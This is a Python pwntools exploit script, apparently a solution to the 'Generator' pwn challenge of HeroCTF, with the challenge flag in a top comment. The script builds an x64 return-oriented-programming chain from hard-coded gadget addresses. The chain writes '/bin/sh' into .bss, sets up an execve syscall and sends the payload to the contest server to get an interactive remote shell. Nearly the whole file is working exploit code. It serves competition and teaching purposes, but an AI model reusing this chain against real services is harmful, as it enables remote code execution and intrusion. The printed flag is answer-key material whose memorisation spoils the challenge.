# Hero{Pr3tty_c00l_x64_R0P_1ntr0_r1ght???}
from pwn import *
import struct
byte  = lambda v: struct.pack("<B", v)
word  = lambda v: struct.pack("<H", v)
dword = lambda v: struct.pack("<I", v)
qword = lambda v: struct.pack("<Q", v)

#0x4011fd: pop rbp; ret
def pop_rbp(rbp = 0):
  return qword(0x4011fd) + qword(rbp)

#0x401222: pop rdi; pop rsi; pop rdx; ret
def pop_rdi_rsi_rdx(rdi = 0, rsi = 0, rdx = 0):
  return qword(0x401222) + qword(rdi) + qword(rsi) + qword(rdx)

#0x401223: pop rsi; pop rdx; ret
def pop_rsi_rdx(rsi = 0, rdx = 0):
  return qword(0x401223) + qword(rsi) + qword(rdx)

#0x401224: pop rdx; ret
def pop_rdx(rdx = 0):
  return qword(0x401224) + qword(rdx)

# 0x401226: xchg rdx, rax; ret
def xchg_rdx_rax():
  return qword(0x401226)

# 0x40121e: xor [rdi], rsi; ret
def www():
  return qword(0x40121e)

bss = 0x0000000000404058
padding = b'yes' + cyclic(100).split(b'aaeaaafa')[0]

payload  = padding
payload += pop_rdi_rsi_rdx(rdi = bss, rsi = u64(b'/bin/sh\0'), rdx = 59)
payload += www()
payload += xchg_rdx_rax()
payload += pop_rsi_rdx()
payload += qword(0x401229) # syscall


open('tmp', 'wb').write(payload)

# p = process('./Generator')
p = remote('pwn.heroctf.fr', 8000)
p.sendline(payload)
p.interactive()
